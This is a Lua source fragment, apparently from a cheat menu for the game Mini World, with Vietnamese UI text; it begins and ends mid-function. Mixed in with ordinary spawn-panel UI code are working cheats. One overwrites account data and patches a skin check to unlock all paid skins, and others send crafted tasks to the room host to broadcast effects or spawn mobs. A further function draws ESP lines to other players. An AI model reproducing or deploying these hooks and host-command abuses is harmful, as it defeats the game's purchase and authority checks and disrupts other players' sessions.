            originalOnClose(self, ...)
        end
    end
    
    return true
end




-- ==================== 通用工具函数 ====================
function readFile_1(ft)
    local filepath = filepath_root..'axdx/'..ft..'/3'
    local file, err = io.open(filepath, "r")
    if not file then return '' end
    local content = file:read("*a")
    file:close()
    return content
end

function readFile(ft)
    local filepath = filepath_root..'axdx/'..ft..'/text'
    local file, err = io.open(filepath, "r")
    if not file then return '' end
    local content = file:read("*a")
    file:close()
    return content
end

function trigger()
    InitGameAPI()
    GameVmTriggerInit()
end

function RoomIsSer()
    local csroomidS = GetCurrentCSRoomId()
    if not csroomidS or csroomidS == "" then
        MessageBox(4, "Chế độ trực tuyến không khả dụng, hãy chuyển sang máy chủ đám mây")
        return false
    end
    return true
end

-- ==================== 统一确认框 ====================
function ShowConfirmFrame(title, onEnable, onDisable)
    getglobal("OutGameConfirmFrameFor4399"):Show()
    getglobal("OutGameConfirmFrameFor4399Desc"):SetText("#K" .. title, 40, 38, 33)
    currentConfirmCallback = { onEnable = onEnable, onDisable = onDisable }
end

function OutGameConfirmFrameLeftBtnFor4399_OnClick()
    getglobal("OutGameConfirmFrameFor4399"):Hide()
    if currentConfirmCallback and currentConfirmCallback.onEnable then
        currentConfirmCallback.onEnable()
    end
end

function OutGameConfirmFrameRightBtnFor4399_OnClick()
    getglobal("OutGameConfirmFrameFor4399"):Hide()
    if currentConfirmCallback and currentConfirmCallback.onDisable then
        currentConfirmCallback.onDisable()
    end
end

-- ==================== 房员列表相关 ====================
local HomelandLuas = {
    "ui/mobile/mvc/homeland/eventrecord/HomeEventRecordCtrl.lua",
    "ui/mobile/mvc/homeland/eventrecord/HomeEventRecordModel.lua",
    "ui/mobile/mvc/homeland/eventrecord/HomeEventRecordView.lua"
}

function LoadHomelandLuas()
    for i, luapath in ipairs(HomelandLuas) do
        if g_LuaPreLoadMgr and g_LuaPreLoadMgr.LoadALuaFile then
            g_LuaPreLoadMgr:LoadALuaFile(luapath)
        end
    end
end

function GetPlayerUinList()
    local uin_list = {}
    if ClientCurGame and ClientCurGame:isInGame() and AccountManager and AccountManager:getMultiPlayer() > 0 then
        local num = ClientCurGame:getNumPlayerBriefInfo() or 0
        for i = 1, num do
            local briefInfo = ClientCurGame:getPlayerBriefInfo(i - 1)
            if briefInfo and briefInfo.uin and briefInfo.uin > 1000 then
                table.insert(uin_list, briefInfo.uin)
            end
        end
    end
    return uin_list
end



-- ==================== 输入框相关 ====================
local inputContent = nil
function ShowInputFrame(callback)
    local MiniUIManager = GetInst("MiniUIManager")
    MiniUIManager:OpenUI("CommonRenameFrame", "miniui/miniworld/CommonRenameFrame", "CommonRenameFrameAutoGen")
    local inputFrame = MiniUIManager:GetMVC("CommonRenameFrameAutoGen")
    
    function inputFrame:BtnSureClick(obj, context)
        inputContent = self.view.widgets.inputName:getText()
        self:CloseSelf()
        if callback then callback(inputContent) end
    end
end


-- ==================== 功能函数 ====================
-- 专属特

          



















function zstx()
    for a = 0, 100000 do
        threadpool:wait(0.1)
        for i = 1, #commonNameList do
            local tdata = {
                [1] = "actor",
                [2] = "playBodyEffectByFile",
                [3] = { AccountManager:getUin(), commonNameList[i], true }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end
    end
end

-- 获得全皮
function hdqp()
    for a = 0, 100000 do
        threadpool:wait(0.1)
        local accountData = AccountManager:getAccountData().Account.BillDataSvr
        accountData.RoleSkinNum = 1000
        local t = {}
        for i = 1, 1000 do
            t[i] = { ExpireTime = -1, SkinID = i }
        end
        accountData.RoleSkinInfo = t
        AccountManager.useRoleSkinModel = function(self, skinid) return true end
    end
end


function zdsw()
    getglobal("CreateMonsterFrame"):Show()
    
      local CreateMonsterTable = {
	config = {
		-- 右侧属性面板所有UI控件配置数组（滑块/开关/分割线/生物选择框）
		widgetAttributes = {
			-- 控件1：生物选择下拉框
			{
				Type = "Selection",
				Name_StringID = 6317,
				CurVal = 0,
				CanShow = true
			},
			-- 分割线1
			{
				Type = "Line",
				Title_StringID = 21201,
				CanShow = true
			},
			-- 控件2：单次生成生物数量 滑块
			{
				Type = "Slider",
				Name_StringID = 21202,
				CurVal = 1,
				Min = 1, Max = 32, Step = 1,
				ValShowType = "Int",
				CanShow = true
			},
			-- 控件3：高级参数总开关
			{
				Type = "Switch",
				Name_StringID = 21208,
				CurVal = false,
				CanShow = true,
				HelpButton = true
			},
			-- 控件4：生成延迟 滑块
			{
				Type = "Slider",
				Name_StringID = 21203,
				CurVal = 10,
				Min = 1, Max = 100, Step = 1,
				ValShowType = "Int",
				CanShow = false,
				HelpButton = true
			},
			-- 分割线2
			{
				Type = "Line",
				Title_StringID = 21204,
				CanShow = true
			},
			-- 控件5：生成横向范围
			{
				Type = "Slider",
				Name_StringID = 21204,
				CurVal = 1,
				Min = 1, Max = 32, Step = 1,
				ValShowType = "IntUnit",
				Unit_StringID = 9111,
				CanShow = true
			},
			-- 控件6：生成纵向范围
			{
				Type = "Slider",
				Name_StringID = 21205,
				CurVal = 1,
				Min = 1, Max = 256, Step = 1,
				ValShowType = "IntUnit",
				Unit_StringID = 9111,
				CanShow = true
			},
			-- 分割线3
			{
				Type = "Line",
				Title_StringID = 21206,
				CanShow = true
			},
			-- 控件7：生成上限总开关
			{
				Type = "Switch",
				Name_StringID = 21206,
				CurVal = false,
				CanShow = true
			},
			-- 控件8：地图最大存活生物数量
			{
				Type = "Slider",
				Name_StringID = 21207,
				CurVal = 18,
				Min = 1, Max = 180, Step = 1,
				ValShowType = "IntUnit",
				Unit_StringID = 559,
				CanShow = false,
				HelpButton = true
			}
		},
		-- 默认生物分类列表（3个分类）
	defaultMonsters = {
    -- 第1页：常见动物/生物
  {
    Type = 1,
    ID = {3010,3011,3012,3013,3014,3015,3016,3017,3018,3019,3020,3021,3022,3095,3096,3097,
          3098,3099,3200,3201,3202,3203,3204,3205,3206,3207,3208,3209,3210,3211,3212,3213,
          3214,3215,3216,3217,3218,3219,3222,3223,3229,3230,3231,3232,3233,3234,3235,3236,
          3237,3238,3239,3241,3242,3243,3400,3401,3402,3403,3404,3405,3406,3407,3408,3409,
          3410,3411,3412,3413,3414,3415,3416,3417,3418,3419,3421,3422,3423,3424,3505,3506,
          3507}
},
    -- 第2页：动物/怪物
    {
    Type = 2,
    ID = {3101,3102,3103,3105,3107,3109,3110,3111,3112,3113,3114,3115,3116,3117,3118,3120,
          3121,3122,3123,3124,3125,3126,3130,3131,3132,3135,3165,3166,3167,3168,3169,3170,
          3171,3172,3173,3174,3175,3176,3177,3178,3179,3180,3181,3182,3183,3184,3185,3186,
          3187,3188,3189,3190,3191,3192,3193,3194,3195,3196,3197,3198,3199,3220,3221,3224,
          3225,3226,3227,3228,3244,3245,3246,3247,3248,3249,3250,3251,3252,3253,3254,3255,
          3261}
},
    -- 第3页：怪物/Boss/特殊

        -- Type3：BOSS/精英（精简到81个）
{
    Type = 3,
    ID = {3420,3425,3521,3240,3230,3231,3232,3507,3898,3899,3520,3519,3505,3506,3508,3509,
      3517,3897,3900,3916,3917,3918,3919,3928,3934,4001,4002,4200,4201,4500,4501,4502,
      4503,4504,4505,4506,4507,4508,4509,4510,4511,4512,4513,4514,4515,4516,4517,4518,
      4519,4520,4521,4522,4523,4524,4525,4526,4527,4528,4529,4530,4531,4532,4533,4534,
      4535,4536,4537,4538,4539,4540,4541,4542,4543,4544,4545,4546,4547,3501,3502,3503,
      3504,3510,3511,3512,3513,3514,3515,3516}
}
		},
		
		-- 帮助弹窗布局配置
		helpButtons = {
			SingleCreateSelection1HelpBtn = {
				name = "SingleCreateSelection1HelpBtn",
				childName = {"Bkg","Icon","Choose","Attribute","Life","Attack","Describe","Details"},
				children = {},
				childrenAttr = {
					closed = {
						{"point","Bkg","top","SingleCreateSelection1HelpBtnNormal","bottom",-61,0},
						{"point","","bottomleft","SingleCreateSelection1Btn","bottomright",5,0},
						{"point","Normal","bottomleft","SingleCreateSelection1Btn","bottomright",5,0},
						{"point","PushedBG","bottomleft","SingleCreateSelection1Btn","bottomright",5,0},
						{"size","",30,31},
						{"strata","",4}
					},
					opening = {
						{"point","Bkg","top","SingleCreateSelection1HelpBtnNormal","bottom",-61,0},
						{"point","","bottomleft","SingleCreateSelection1Btn","bottomright",5,0},
						{"point","Normal","bottomleft","SingleCreateSelection1Btn","bottomright",5,0},
						{"point","PushedBG","bottomleft","SingleCreateSelection1Btn","bottomright",5,0},
						{"size","",668,200},
						{"strata","",5}
					}
				}
			}
		},
		height = {
			Line = 40,
			Switch = 60,
			Slider = 70,
			Selection = 150
		}
	},
	-- 全局常量定义
	constants = {
		INIT_ID = 4000,
		MAX_TAB_NUM = 3,  -- 3个分类
		MAX_ORGANISM_GRID_NUM = 81,
		IO_PARAMS_NAME = {
			"MobResID","everyNum","maxNum","spawnWide","spawnHigh","spawnDelay","numSwitch","DelaySwitch"
		},
		IO_PARAMS_INDEX = {1,3,5,7,8,11,4,10},
		-- 分类标签多语言文本
		TAB_NAME_STRING_ID = {
			[1] = "Sinh vật",
			[2] = "Quái vật",
			[3] = "Vật phẩm đặc biệt"
		}
	},
	organismdefs = {}
}

local main = CreateMonsterTable
local tmpChooseMonsterDef, curChooseMonsterDef
local curChooseType = 1  -- 默认选中"生物"分类（Type=1）
local needInit = true

function getCreateMonsterTable()
	return CreateMonsterTable
end

local function getType(id)
	for i = 1, #main.config.defaultMonsters do
		local ids = main.config.defaultMonsters[i]
		for j = 1, #ids.ID do
			if id == ids.ID[j] then
				return ids.Type
			end
		end
	end
	return 1
end

-- 给图标控件加载生物头像
local function setIcon(icon, def)
	if tonumber(def.ID) and tonumber(def.ID) == main.constants.INIT_ID then
		return
	end
	if def.ModelType == MONSTER_CUSTOM_MODEL then
		SetModelIcon(icon, def.Model, ACTOR_MODEL)
		return
	elseif def.ModelType == MONSTER_FULLY_CUSTOM_MODEL then
		SetModelIcon(icon, def.Model, FULLY_ACTOR_MODEL)
		return
	elseif def.ModelType == MONSTER_IMPORT_MODEL then
		SetModelIcon(icon, def.Model, IMPORT_ACTOR_MODEL)
		return
	end
	if tonumber(def.Icon) and tonumber(def.Icon) > 0 then
		icon:SetTexture("ui/roleicons/" .. def.Icon .. ".png", true)
	else
		icon:SetTexture("ui/roleicons/" .. def.ID .. ".png", true)
	end
	if type(def.Icon) == "string" and string.sub(def.Icon, 1, 1) == "a" then
		AvatarSetIconByID(def, icon)
	end
end

local function hideHelpBtn(exclude)
	if getglobal("SingleCreateSlider2HelpBtnBkg"):IsShown() and exclude ~= 1 then
		getglobal("SingleCreateSlider2HelpBtnBkg"):Hide()
		getglobal("SingleCreateSlider2HelpBtnTips"):Hide()
		getglobal("SingleCreateSlider2HelpBtn"):SetFrameStrataInt(4)
		getglobal("SingleCreateSlider2HelpBtn"):SetSize(30, 31)
	end
	if getglobal("SingleCreateSwitch1HelpBtnBkg"):IsShown() and exclude ~= 2 then
		getglobal("SingleCreateSwitch1HelpBtnBkg"):Hide()
		getglobal("SingleCreateSwitch1HelpBtnTips"):Hide()
		getglobal("SingleCreateSwitch1HelpBtn"):SetFrameStrataInt(4)
		getglobal("SingleCreateSwitch1HelpBtn"):SetSize(30, 31)
	end
	if getglobal("SingleCreateSelection1HelpBtnBkg"):IsShown() and exclude ~= 3 then
		getglobal("SingleCreateSelection1HelpBtn"):SetFrameStrataInt(4)
		getglobal("SingleCreateSelection1HelpBtn"):SetSize(30, 31)
		getglobal("SingleCreateSelection1HelpBtnBkg"):SetPoint("top", "SingleCreateSelection1HelpBtn", "top", -61, 0)
		getglobal("SingleCreateSelection1HelpBtn"):SetPoint("bottomleft", "SingleCreateSelection1", "bottomright", 5, 0)
		local names = main.config.helpButtons.SingleCreateSelection1HelpBtn.childName
		for i = 1, #names do
			getglobal("SingleCreateSelection1HelpBtn" .. names[i]):Hide()
		end
	end
end

function CreateMonsterFrame_OnClick()
	if getglobal("SingleCreateSelection1HelpBtnBkg"):IsShown() then
		CreateMonsterHelpBtn_OnClick()
	end
	hideHelpBtn(0)
end

function CreateMonsterFrame_OnShow()
	if not needInit then
		return
	end
	needInit = false
	HideAllFrame("CreateMonsterFrame", true)
	hideHelpBtn(0)
	LoadOrganismDef()
	if not getglobal("CreateMonsterFrame"):IsReshow() then
		ClientCurGame:setOperateUI(true)
	end
	local curSetting = OpenContainer:getBrushMonsterAttr()
	local names = main.constants.IO_PARAMS_NAME
	local indexs = main.constants.IO_PARAMS_INDEX
	for i = 1, #names do
		main.config.widgetAttributes[indexs[i]].CurVal = curSetting[names[i]]
		if names[i] == "spawnDelay" then
			main.config.widgetAttributes[indexs[i]].CurVal = main.config.widgetAttributes[indexs[i]].CurVal / 20
		end
		if string.find(names[i], "Switch") then
			main.config.widgetAttributes[indexs[i] + 1].CanShow = curSetting[names[i]]
		end
	end
	if main.config.widgetAttributes[1].CurVal == main.constants.INIT_ID then
		curChooseMonsterDef = nil
		tmpChooseMonsterDef = nil
	end
	UpdateCreateMonsterFrame()
end

function CreateMonsterFrame_OnHide()
	needInit = true
	curChooseType = 1
	curChooseMonsterDef = nil
	tmpChooseMonsterDef = nil
	ShowMainFrame()
	if not getglobal("CreateMonsterFrame"):IsRehide() then
		ClientCurGame:setOperateUI(false)
	end
	UIFrameMgr:setCurEditBox(nil)
end

function CreateMonsterFrame_OnLoad()
	UpdateCreateMonsterFrame()
	for i = 1, main.constants.MAX_ORGANISM_GRID_NUM / 9 do
		for j = 1, 9 do
			local index = (i - 1) * 9 + j
			local grid = getglobal("OrganismGrid" .. index)
			grid:SetPoint("topleft", "OrganismGridBoxPlane", "topleft", (j - 1) * 84, (i - 1) * 84)
		end
	end
end

function CreateMonsterFrameCloseBtn_OnClick()
	hideHelpBtn(0)
	getglobal("CreateMonsterFrame"):Hide()
end

-- 保存按钮：把UI参数写入刷怪方块属性并关闭面板
function CreateMonsterFrameSaveBtn_OnClick()
	hideHelpBtn(0)
	if curChooseMonsterDef then
		local params = {}
		local attr = CreateMonsterTable.config.widgetAttributes
		-- 组装存储参数
		params.id = curChooseMonsterDef.ID
		params.everyNum = attr[3].CurVal
		params.maxNum = attr[5].CurVal
		params.spawnWide = attr[7].CurVal
		params.spawnHigh = attr[8].CurVal
		params.spawnDelay = attr[11].CurVal
		params.numSwitch = attr[4].CurVal
		params.delaySwitch = attr[10].CurVal
		
		if next(params) == nil then
			Log("CreateMonsterFrameSaveBtn_OnClick : params ERROR !!!")
		else
			-- 持久化参数到刷怪方块
			OpenContainer:setBrushMonsterAttr(params.id, params.everyNum, params.maxNum, params.spawnWide, params.spawnHigh, params.spawnDelay, params.numSwitch, params.delaySwitch)
			
			-- ===== 执行刷怪脚本 =====
			-- 获取玩家位置
			local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
			local new_x, new_y, new_z = x / 100, y / 100, z / 100
			
			-- 加上偏移量（横向范围 + 纵向范围）
			local offsetX = params.spawnWide or 1
			local offsetZ = params.spawnWide or 1
			local offsetY = params.spawnHigh or 1
			
			-- 生成在玩家前方偏移位置
			local spawnX = new_x + offsetX
			local spawnY = new_y + offsetY
			local spawnZ = new_z + offsetZ
			
			-- 打印调试信息
			print("=== 刷怪执行 ===")
			print("生物ID: " .. params.id)
			print("生成数量: " .. params.everyNum)
			print("玩家位置: " .. new_x .. ", " .. new_y .. ", " .. new_z)
			print("生成位置: " .. spawnX .. ", " .. spawnY .. ", " .. spawnZ)
			
			-- 组装数据
			local tdata = {
				[1] = "world",
				[2] = "spawnMob",
				[3] = { 
					spawnX,          -- X坐标（玩家位置 + 横向偏移）
					spawnY,          -- Y坐标（玩家位置 + 纵向偏移）
					spawnZ,          -- Z坐标（玩家位置 + 横向偏移）
					params.id,       -- 生物ID
					params.everyNum, -- 生成数量
					true             -- 固定参数
				}
			}
			-- 发送到服务端执行
			ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
			-- ===== 结束 =====
		end
		ShowGameTips(GetS(3940))
		getglobal("CreateMonsterFrame"):Hide()
	end
end

function ChooseOrganismFrame_OnLoad()
end

function ChooseOrganismFrame_OnShow()
	UpdateOrganismGridBox()
	getglobal("ChooseOrganismFrameOkBtn"):SetClientID(0)
end

function ChooseOrganismFrame_OnHide()
end

local checkedHaloName

function OrganismGridTemplate_OnClick()
	local id = this:GetClientID()
	if checkedHaloName then
		getglobal(checkedHaloName .. "Checked"):Hide()
	end
	checkedHaloName = this:GetName()
	getglobal(checkedHaloName .. "Checked"):Show()
	tmpChooseMonsterDef = nil
	local def = ModEditorMgr:getMonsterDefById(id)
	def = def or MonsterCsv:get(id)
	if def then
		UpdateTipsFrame(def.Name, 0)
		tmpChooseMonsterDef = def
		print(tmpChooseMonsterDef.ID)
	end
end

function CreateTabTemplate_OnClick()
	local index = this:GetClientID()
	local btnName = this:GetName()
	local checked = getglobal(btnName .. "Checked")
	if checked:IsShown() then
		return
	end
	local defs = main.organismdefs
	if defs and defs[index] then
		curChooseType = defs[index].Type
	end
	UpdateOrganismGridBox()
	SetChooseOrganismFrameTab()
end

function ChooseOrganismFrameClose_OnClick()
	hideHelpBtn(0)
	getglobal("ChooseOrganismFrame"):Hide()
	tmpChooseMonsterDef = nil
end

local selectCallBack

function SetCreateMonsterFrameSelectMonsterCallBack(callback)
	selectCallBack = callback
end

function ChooseOrganismFrameOkBtn_OnClick()
	curChooseMonsterDef = tmpChooseMonsterDef
	if curChooseMonsterDef then
		getglobal("ChooseOrganismFrame"):Hide()
		main.config.widgetAttributes[1].CurVal = curChooseMonsterDef.ID
		local name = getglobal("SingleCreateSelection1" .. "Choose")
		local icon = getglobal("SingleCreateSelection1" .. "Btn" .. "Icon")
		name:SetText(curChooseMonsterDef.Name)
		setIcon(icon, curChooseMonsterDef)
		getglobal("SingleCreateSelection1" .. "HelpBtn"):Show()
		name:Show()
		icon:Show()
		if selectCallBack then
			selectCallBack(curChooseMonsterDef)
		end
	end
end

function UpdateCreateMonsterFrame()
	local attributes = main.config.widgetAttributes
	local height = main.config.height
	local widgetIndex = {Selection = 1, Line = 1, Switch = 1, Slider = 1}
	local pointY = 0
	for i = 1, #attributes do
		local frame = getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type])
		if frame then
			if attributes[i].Type == "Slider" then
				local name = getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "Name")
				local valFont = getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "Val")
				local bar = getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "Bar")
				local curVal = attributes[i].CurVal
				bar:SetMinValue(attributes[i].Min)
				bar:SetMaxValue(attributes[i].Max)
				bar:SetValueStep(attributes[i].Step)
				bar:SetValue(curVal)
				name:SetText(GetS(attributes[i].Name_StringID))
				if attributes[i].ValShowType == "Int" then
					valFont:SetText(curVal)
				elseif attributes[i].ValShowType == "IntUnit" then
					valFont:SetText(curVal .. GetS(attributes[i].Unit_StringID))
				end
			elseif attributes[i].Type == "Line" then
				if attributes[i].Title_StringID then
					getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "LineZheZhao"):Show()
					getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "Title"):Show()
					getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "Title"):SetText(GetS(attributes[i].Title_StringID))
				else
					getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "LineZheZhao"):Hide()
					getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "Title"):Hide()
				end
			elseif attributes[i].Type == "Switch" then
				local name = getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "Name")
				local switchBtn = getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "Btn")
				local state = attributes[i].CurVal and 1 or 0
				name:SetText(GetS(attributes[i].Name_StringID))
				SetSwitchBtnState(switchBtn:GetName(), state)
			elseif attributes[i].Type == "Selection" then
				local name = getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "Name")
				local attrBtn = getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "HelpBtn")
				local choose = getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "Choose")
				local id = attributes[i].CurVal
				local btn = getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "Btn")
				local icon = getglobal(btn:GetName() .. "Icon")
				name:SetText(GetS(attributes[i].Name_StringID))
				if attributes[i].CurVal ~= main.constants.INIT_ID then
					btn:Show()
					curChooseMonsterDef = ModEditorMgr:getMonsterDefById(id)
					if not curChooseMonsterDef then
						curChooseMonsterDef = MonsterCsv:get(id)
					end
					if curChooseMonsterDef then
						setIcon(icon, curChooseMonsterDef)
						choose:SetText(curChooseMonsterDef.Name)
						choose:Show()
						attrBtn:Show()
						icon:Show()
					end
				else
					choose:Hide()
					attrBtn:Hide()
					icon:Hide()
				end
			end
			frame:SetClientID(i)
			if i == 1 then
				frame:SetPoint("bottom", "SingleCreateAttrBox", "top", 0, pointY)
			else
				frame:SetPoint("top", "SingleCreateAttrBoxPlane", "top", 0, pointY)
			end
			if attributes[i].HelpButton then
				getglobal("SingleCreate" .. attributes[i].Type .. widgetIndex[attributes[i].Type] .. "HelpBtn"):Show()
			end
			if 1 < i and attributes[i].CanShow then
				pointY = pointY + height[attributes[i].Type]
			end
		else
			Log("ERROR : uiFrame is nil")
		end
		if attributes[i].CanShow then
			frame:Show()
		else
			frame:Hide()
		end
		widgetIndex[attributes[i].Type] = widgetIndex[attributes[i].Type] + 1
	end
	if pointY < 516 then
		pointY = 516
	end
	getglobal("SingleCreateAttrBoxPlane"):SetHeight(pointY)
end

local function getTableByType(type)
	local defs = main.organismdefs
	for i = 1, #defs do
		if type == defs[i].Type then
			return defs[i].t
		end
	end
	return nil
end

function UpdateOrganismGridBox()
	if checkedHaloName then
		getglobal(checkedHaloName .. "Checked"):Hide()
	end
	getglobal("OrganismGridBox"):resetOffsetPos()
	local typeTable = getTableByType(curChooseType)
	if typeTable == nil then
		ShowGameTips(GetS(3758), 3)
		getglobal("ChooseOrganismFrame"):Hide()
		return
	end
	local num = #typeTable
	for i = 1, main.constants.MAX_ORGANISM_GRID_NUM do
		local grid = getglobal("OrganismGrid" .. i)
		if i <= num then
			grid:Show()
			grid:SetClientID(typeTable[i].ID)
			local icon = getglobal(grid:GetName() .. "Icon")
			setIcon(icon, typeTable[i])
		else
			grid:Hide()
		end
	end
	local height = 333 + math.ceil((num - 36) / 9) * 84
	if height < 333 then
		height = 333
	end
	getglobal("OrganismGridBoxPlane"):SetSize(755, height)
end

function SetChooseOrganismFrame()
	LoadOrganismDef()
	SetChooseOrganismFrameTab()
	UpdateOrganismGridBox()
	getglobal("ChooseOrganismFrame"):Show()
end

function SetChooseOrganismFrameTab()
	local defs = main.organismdefs
	for i = 1, main.constants.MAX_TAB_NUM do
		local tab = getglobal("ChooseOrganismFrameTabs" .. i)
		if tab then
			local name = getglobal("ChooseOrganismFrameTabs" .. i .. "Name")
			local normal = getglobal("ChooseOrganismFrameTabs" .. i .. "Normal")
			local checked = getglobal("ChooseOrganismFrameTabs" .. i .. "Checked")
			tab:SetClientID(i)
			if defs[i] and defs[i].Type == curChooseType then
				normal:Hide()
				checked:Show()
			else
				normal:Show()
				checked:Hide()
			end
			tab:Show()
			local type = defs[i].Type
			local nameStr = main.constants.TAB_NAME_STRING_ID[type]
			name:SetText(nameStr or "Phân loại" .. type)
		end
	end
end

function LoadOrganismDef()
	main.organismdefs = {}
	local defs = main.organismdefs
	for i = 1, #main.config.defaultMonsters do
		local one = main.config.defaultMonsters[i]
		for j = 1, #one.ID do
			local def = MonsterCsv:get(one.ID[j])
			if def then
				local t = getTableByType(one.Type)
				if t == nil then
					table.insert(defs, {Type = one.Type, t = {def}})
				else
					table.insert(t, def)
				end
			end
		end
	end
	table.sort(defs, function(a, b)
		return a.Type < b.Type
	end)
end

function CreateMonsterHelpBtn_OnClick()
	hideHelpBtn(3)
	local btn = main.config.helpButtons.SingleCreateSelection1HelpBtn
	local attr
	if next(btn.children) == nil then
		for i = 1, #btn.childName do
			btn.children[btn.childName[i]] = getglobal(btn.name .. btn.childName[i])
		end
	end
	setIcon(btn.children.Icon, curChooseMonsterDef)
	btn.children.Choose:SetText(curChooseMonsterDef.Name)
	local typeId = getType(curChooseMonsterDef.ID)
	local typeName = main.constants.TAB_NAME_STRING_ID[typeId] or "Phân loại không xác định"
	btn.children.Attribute:SetText(GetS(1107) .. GetS(8503) .. typeName)
	btn.children.Life:SetText(GetS(4300) .. GetS(8503) .. curChooseMonsterDef.Life)
	local atkpoint = 0
	if 0 <= curChooseMonsterDef.AttackType and curChooseMonsterDef.AttackType <= 2 then
		atkpoint = curChooseMonsterDef.Attacks[curChooseMonsterDef.AttackType]
	end
	btn.children.Attack:SetText(GetS(4302) .. GetS(8503) .. atkpoint)
	if tostring(curChooseMonsterDef.Desc) ~= "" then
		btn.children.Details:SetText(curChooseMonsterDef.Desc)
	else
		btn.children.Details:SetText(GetS(58))
	end
	if btn.children.Bkg and btn.children.Bkg:IsShown() then
		attr = btn.childrenAttr.closed
	else
		attr = btn.childrenAttr.opening
	end
	for i = 1, #attr do
		local fun = attr[i]
		local obj = getglobal(btn.name .. fun[2])
		if fun[1] == "point" then
			obj:SetPoint(fun[3], fun[4], fun[5], fun[6], fun[7])
		elseif fun[1] == "size" then
			obj:SetSize(fun[3], fun[4])
		elseif fun[1] == "strata" then
			obj:SetFrameStrataInt(fun[3])
		end
	end
	for i = 1, #btn.childName do
		local child = btn.children[btn.childName[i]]
		if child:IsShown() then
			child:Hide()
		else
			child:Show()
		end
	end
end

function SingleCreateFeatureHelpBtn_OnClick()
	local bkg, tips
	if string.find(this:GetName(), "Slider") then
		hideHelpBtn(1)
		bkg = getglobal("SingleCreateSlider2HelpBtnBkg")
		tips = getglobal("SingleCreateSlider2HelpBtnTips")
		if bkg:IsShown() then
			getglobal("SingleCreateSlider2HelpBtnNormal"):SetPoint("topleft", "SingleCreateSlider2HelpBtn", "topleft", 0, 0)
		else
			getglobal("SingleCreateSlider2HelpBtnNormal"):SetPoint("bottomright", "SingleCreateSlider2HelpBtn", "bottomright", 0, 0)
			this:SetSize(240, 200)
		end
	else
		hideHelpBtn(2)
		bkg = getglobal("SingleCreateSwitch1HelpBtnBkg")
		tips = getglobal("SingleCreateSwitch1HelpBtnTips")
		if bkg:IsShown() then
		else
			this:SetSize(220, 220)
		end
	end
	if bkg:IsShown() then
		bkg:Hide()
		tips:Hide()
		this:SetFrameStrataInt(4)
		this:SetSize(30, 31)
	else
		this:SetFrameStrataInt(5)
		bkg:Show()
		tips:Show()
	end
end

function CreateSliderTemplateLeftBtn_OnClick()
	hideHelpBtn()
	local value = getglobal(this:GetParent() .. "Bar"):GetValue()
	local index = this:GetParentFrame():GetClientID()
	local widget = main.config.widgetAttributes[index]
	value = value - widget.Step
	getglobal(this:GetParent() .. "Bar"):SetValue(value)
end

function CreateSliderTemplateBar_OnValueChanged()
	hideHelpBtn()
	local value = this:GetValue()
	local ratio = (value - this:GetMinValue()) / (this:GetMaxValue() - this:GetMinValue())
	if 1 < ratio then ratio = 1 end
	if ratio < 0 then ratio = 0 end
	local width = math.floor(183 * ratio)
	getglobal(this:GetName() .. "Pro"):ChangeTexUVWidth(width)
	getglobal(this:GetName() .. "Pro"):SetWidth(width)
	local index = this:GetParentFrame():GetClientID()
	local t = main.config.widgetAttributes[index]
	t.CurVal = value
	local valFont = getglobal(this:GetParent() .. "Val")
	if t.ValShowType then
		if t.ValShowType == "Int" then
			valFont:SetText(value)
		elseif t.ValShowType == "IntUnit" then
			valFont:SetText(value .. GetS(t.Unit_StringID))
		end
	end
end

function CreateSliderTemplateRightBtn_OnClick()
	hideHelpBtn()
	local value = getglobal(this:GetParent() .. "Bar"):GetValue()
	local index = this:GetParentFrame():GetClientID()
	local widget = main.config.widgetAttributes[index]
	value = value + widget.Step
	getglobal(this:GetParent() .. "Bar"):SetValue(value)
end

function CreateSelBtnTemplate_OnClick()
	if getglobal("SingleCreateSelection1HelpBtnBkg"):IsShown() then
		CreateMonsterHelpBtn_OnClick()
	end
	hideHelpBtn()
	SetChooseOrganismFrame()
end

function CreateSwitchTemplateBtn_OnClick(swithcName, state)
	hideHelpBtn()
	local switch = getglobal(swithcName)
	local index = switch:GetParentFrame():GetClientID()
	local widget = main.config.widgetAttributes[index]
	state = state == 1
	widget.CurVal = state
	if state then
		main.config.widgetAttributes[index + 1].CanShow = true
	else
		main.config.widgetAttributes[index + 1].CanShow = false
	end
	UpdateCreateMonsterFrame()
end
end

function hzwj()
local myUin = AccountManager:getUin()
local size = ClientCurGame:requireArrayOfPlayers(-1, -1)
for i = 1, size do
    local targetPlayer = ClientCurGame:getIthPlayerInArray(i - 1)  -- 修正索引
    if targetPlayer then
        local targetUin = targetPlayer:getUin()
        if targetUin ~= myUin then
            local size = 100
            local color = 0xff0000
            local id = 10230 + i  -- 使 ID 唯一

            local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
            local new_x = x / 100
            local new_y = y / 100 + 90
            local new_z = z / 100

            GraphicsManager:createGraphicsLine(3, 0, targetUin, 0, 0, 0, size, color, id, new_x, new_y, new_z)
        end
    end
end
end

function sdsj()
    ShowTextInputSafe(function(text)
        local value = tonumber(text)
        if not value then
            ShowGameTipsWithoutFilter("Hãy nhập số hợp lệ (giá trị thời gian)")
            return
        end
        local tdata = {
            [1] = "gamerule",
            [2] = "setTimLocked",
            [3] = { value }
        }
